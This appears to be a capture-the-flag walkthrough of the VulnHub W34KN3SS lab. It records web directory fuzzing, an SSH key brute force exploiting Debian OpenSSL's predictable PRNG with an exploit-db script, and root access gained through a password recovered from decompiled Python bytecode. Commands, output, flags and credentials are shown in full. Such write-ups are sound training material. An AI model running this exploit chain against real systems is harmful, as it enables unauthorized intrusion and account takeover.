# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/W34KN3SS]
└─# ffuf -u http://192.168.236.9/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.php,.txt' -fw 22

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://192.168.236.9/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .php .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 22
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
blog                    [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
test                    [Status: 301, Size: 315, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
upload.php              [Status: 200, Size: 216, Words: 13, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 5637 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
- `index.html`
- `blog`
- `test`
- `uploads`
- `upload.php`

## TCP/443 - HTTPS
### FFUF
- Same as TCP/80
### NMAP Scan:
```
PORT    STATE SERVICE  REASON         VERSION
443/tcp open  ssl/http syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
| ssl-cert: Subject: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth
| Issuer: commonName=weakness.jth/organizationName=weakness.jth/stateOrProvinceName=Jordan/countryName=jo/localityName=Amman/emailAddress=n30@weakness.jth
```
- `weakness.jth`
	- Usually it is `localhost.localdomain`
# Initial Foothold
## TCP/80 - HTTP - Obtain some credentials
1. Add `weakness.jth` to `/etc/hosts`
2. View enumerated directories
	- `index.html`
		![](images/Pasted%20image%2020220124171810.png)
		- `n30` - Could be a username?
	- `blog`
		![](images/Pasted%20image%2020220124172156.png)
		- Does not have HTTP PUT method
	- `test`
		![](images/Pasted%20image%2020220124172140.png)
	- `uploads`
		![](images/Pasted%20image%2020220124172114.png)
		- Does not have HTTP PUT method
	- `upload.php`
		![](images/Pasted%20image%2020220124172056.png)
3. Attempt to upload a file at `upload.php`
	![](images/Pasted%20image%2020220124172612.png)
	- Failed to upload
4. Decode Base64 Encoded text
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS]
	└─# echo -n V0UgSlVTVCBURVNUIFRISVMgU0NSSVBUV0UgSlVTVCBURVNUIFRISVMgU0NSSVBUIEFHQUlOIDpE | base64 -d
	WE JUST TEST THIS SCRIPTWE JUST TEST THIS SCRIPT AGAIN :D
	```
5. Run FFUF against `http://weakness.jth/FUZZ`
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS]
	└─# ffuf -u http://weakness.jth/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fw 22

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://weakness.jth/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .txt .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	 :: Filter           : Response words: 22
	________________________________________________

							[Status: 200, Size: 526, Words: 259, Lines: 31]
	index.html              [Status: 200, Size: 526, Words: 259, Lines: 31]
	index.html              [Status: 200, Size: 526, Words: 259, Lines: 31]
	private                 [Status: 301, Size: 314, Words: 20, Lines: 10]
	robots.txt              [Status: 200, Size: 14, Words: 4, Lines: 2]
	:: Progress: [18460/18460] :: Job [1/1] :: 82 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
	- New directories are enumerated
		- `private`
		- `robots.txt`
6. View newly enumerated directories
	- `robots.txt`
		```
		┌──(root💀kali)-[~/vulnHub/W34KN3SS]
		└─# curl http://weakness.jth/robots.txt -s
		Forget it !! 
		```
	- `private`
		![](images/Pasted%20image%2020220124173446.png)
		- Running a web app
7. Run FFUF against `/private`, web app contains many directories which could have senstive information
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS]
	└─# ffuf -u http://weakness.jth/private/FUZZ -w /usr/share/wordlists/dirb/common.txt 

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://weakness.jth/private/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________

	.htaccess               [Status: 403, Size: 304, Words: 22, Lines: 12]
	.htpasswd               [Status: 403, Size: 304, Words: 22, Lines: 12]
	.hta                    [Status: 403, Size: 299, Words: 22, Lines: 12]
	assets                  [Status: 301, Size: 321, Words: 20, Lines: 10]
							[Status: 200, Size: 989, Words: 75, Lines: 44]
	files                   [Status: 301, Size: 320, Words: 20, Lines: 10]
	index.html              [Status: 200, Size: 989, Words: 75, Lines: 44]
	:: Progress: [4615/4615] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
	```
	- New directories are enumerated
		- `assets`
		- `files`
8. View enumerated directories
	- `assets`
		![](images/Pasted%20image%2020220124173924.png)
	- `files`
		![](images/Pasted%20image%2020220124173950.png)
		- Interesting files found


##  openssl 0.9.8c-1 Exploit
1. View `mykey.pub`
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS]
	└─# curl -s http://weakness.jth/private/files/mykey.pub
	ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
	```
	- Target Machine Hostname: `targetcluster`
	- Private Key Path: `/root/.ssh/id_rsa`
2. View `notes.txt`
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS]
	└─# curl -s http://weakness.jth/private/files/notes.txt
	this key was generated by openssl 0.9.8c-1
	```
	- `openssl 0.9.8c-1`
3. Search exploits for `openssl 0.9.8c-1`

	|  #  | Exploit Title                                                                       | Path                  |
	| --- | ----------------------------------------------------------------------------------- | --------------------- |
	| 1   | OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force | linux/remote/5622.txt |
	| 2   | OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force | linux/remote/5632.rb  |
	| 3   | OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Forc | linux/remote/5720.py

4. `openssl 0.9.8c-1` is exploitable because there are only 65.536 possible ssh  keys generated.
5. Use `linux/remote/5720.py`
	1. Follow the instructions in `5720.py`
	2. Download `5622.tar.bz2`
		```
		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit]
		└─# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 -q
		```
	3. Extract
		```
		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit]
		└─# tar -xvf 5622.tar.bz2
		rsa/2048/2c39076a750679c89ed30581f3371a03-21786.pub
		rsa/2048/34602375d32e68ab98b48ab008a1d0f9-8985
		rsa/2048/b009a4aaa5deae5f11c66a26d0a42de6-11400.pub
		...
		```
	4. Execute python script
		```
		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit]
		└─# python 5720.py 
		-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
		./exploit.py <dir> <host> <user> [[port] [threads]]
			<dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
			<host>: The victim host
			<user>: The user of the victim host
			[port]: The SSH port of the victim host (default 22)
			[threads]: Number of threads (default 4) Too big numer is bad

		┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1]
		└─# python 5720.py rsa/2048/ 192.168.236.9 n30 22 5

		-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
		Tested 202 keys | Remaining 32566 keys | Aprox. Speed 40/sec

		Key Found in file: 4161de56829de2fe64b9055711f531c1-2537
		Execute: ssh -ln30 -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 192.168.236.9

		Tested 280 keys | Remaining 32488 keys | Aprox. Speed 15/sec
		```
	- Found key `4161de56829de2fe64b9055711f531c1-2537`
	![](images/Pasted%20image%2020220124202456.png)
## TCP/22 - SSH 
1. SSH w/ `4161de56829de2fe64b9055711f531c1-2537`
	```
	┌──(root💀kali)-[~/vulnHub/W34KN3SS/192.168.236.9/exploit/openssl-0.9.8c-1]
	└─# ssh -p22 -i rsa/2048//4161de56829de2fe64b9055711f531c1-2537 n30@$ip
	Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

	Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
	n30@W34KN3SS:~$ 
	```
	![](images/Pasted%20image%2020220124202535.png)
2. User Flag
	```
	n30@W34KN3SS:~$ cat user.txt 
	25e3cd678875b601425c9356c8039f68
	n30@W34KN3SS:~$ 
	```
	![](images/Pasted%20image%2020220124202640.png)
# Privilege Escalation
## Root - Via Decompiling Python Binary + Sudo
1. View n30 home directory
	```
	n30@W34KN3SS:~$ ls -la
	total 44
	drwxr-xr-x 5 n30  n30  4096 Aug 14  2018 .
	drwxr-xr-x 3 root root 4096 May  5  2018 ..
	-rw------- 1 n30  n30    25 Aug 14  2018 .bash_history
	-rw-r--r-- 1 n30  n30   220 May  5  2018 .bash_logout
	-rw-r--r-- 1 n30  n30  3771 May  5  2018 .bashrc
	drwx------ 2 n30  n30  4096 May  5  2018 .cache
	-rwxrwxr-x 1 n30  n30  1138 May  8  2018 code
	drwxrwxr-x 3 n30  n30  4096 May  5  2018 .local
	-rw-r--r-- 1 n30  n30   818 May  7  2018 .profile
	drwxrwxr-x 2 n30  n30  4096 May  5  2018 .ssh
	-rw-r--r-- 1 n30  n30     0 May  5  2018 .sudo_as_admin_successful
	-rw-rw-r-- 1 n30  n30    33 May  8  2018 user.txt
	```
	- `.sudo_as_admin_successful`
		- n30 has a sudoers entry
	- `code`
2. See what it does
	```
	n30@W34KN3SS:~$ file code
	code: python 2.7 byte-compiled
	n30@W34KN3SS:~$ python code
	[+]System Started at : Mon Jan 24 22:32:16 2022
	[+]This binary should generate unique hash for the hardcoded login info
	[+]Generating the hash ..
	[+]Your new hash is : 5e335c58fc4a146c0e4716472a34fb79a5c1515c1ea9e77e30d3ec5d172d268f
	[+]Done
	n30@W34KN3SS:~$ 
	```
	- `python2.7 byte-compiled`
	- raw-sha256 (1400)
3. Crack hash
	- Failed to crack
4. Transfer `code` to kali
5. Decompile `code` binary
	```
	mv code code.pyc
	┌──(uncompyle6)(root💀kali)-[~/tools/uncompyle6]
	└─# uncompyle6 -o compiled.py /root/vulnHub/W34KN3SS/192.168.236.9/loot/code 
	
	┌──(uncompyle6)(root💀kali)-[~/tools/uncompyle6]
	└─# cat compiled.py 
	# uncompyle6 version 3.8.0
	# Python bytecode 2.7 (62211)
	# Decompiled from: Python 2.7.18 (default, Sep 24 2021, 09:39:51) 
	# [GCC 10.3.0]
	# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

	# Embedded file name: code.py
	# Compiled at: 2018-05-08 23:50:54
	import os, socket, time, hashlib
	print ('[+]System Started at : {0}').format(time.ctime())
	print '[+]This binary should generate unique hash for the hardcoded login info'
	print '[+]Generating the hash ..'
	inf = ''
	inf += chr(ord('n'))
	inf += chr(ord('3'))
	inf += chr(ord('0'))
	inf += chr(ord(':'))
	inf += chr(ord('d'))
	inf += chr(ord('M'))
	inf += chr(ord('A'))
	inf += chr(ord('S'))
	inf += chr(ord('D'))
	inf += chr(ord('N'))
	inf += chr(ord('B'))
	inf += chr(ord('!'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('B'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('!'))
	inf += chr(ord('#'))
	inf += chr(ord('3'))
	inf += chr(ord('3'))
	hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
	print ('[+]Your new hash is : {0}').format(hashf)
	print '[+]Done'
	```
	- n30:`dMASDNB!!#B!#!#33`
6. Check sudo access
	```
	n30@W34KN3SS:~$ sudo -l
	[sudo] password for n30: dMASDNB!!#B!#!#33
	Matching Defaults entries for n30 on W34KN3SS:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	```
7. Switch to root
	```
	User n30 may run the following commands on W34KN3SS:
		(ALL : ALL) ALL
	n30@W34KN3SS:~$ sudo su
	root@W34KN3SS:/home/n30# whoami
	root
	root@W34KN3SS:/home/n30# 
	```
	![](images/Pasted%20image%2020220124204729.png)
8. Root flag
	```
	root@W34KN3SS:/home/n30# cd /root
	root@W34KN3SS:~# ls
	root.txt
	root@W34KN3SS:~# cat root.txt 
	a1d2fab76ec6af9b651d4053171e042e
	root@W34KN3SS:~# 
	```


---
Tags: 

---		
